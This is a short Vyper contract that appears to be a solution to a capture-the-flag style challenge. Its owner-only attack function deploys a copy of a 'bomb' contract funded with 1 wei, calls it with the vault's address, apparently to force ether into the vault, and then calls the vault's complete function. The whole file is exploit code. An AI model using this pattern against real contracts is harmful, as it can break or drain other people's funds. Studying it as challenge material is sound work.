# @version ^0.3.7

interface IVault:
   def complete(): nonpayable 

owner: immutable(address)

vault: IVault
bomb: address

@external
@payable
def __init__(_vault: address, _bomb: address):
    assert msg.value == 1, "send 1 wei"
    owner = msg.sender
    self.vault = IVault(_vault)
    self.bomb = _bomb

@external
def attack():
    assert msg.sender == owner, "!owner"
    bomb: address = create_copy_of(self.bomb, value=1)
    raw_call(bomb, _abi_encode(self.vault.address))
    self.vault.complete()
    # send 1 wei back to owner for sake of completeness
    send(owner, self.balance)

@external
@payable
def __default__():
    pass
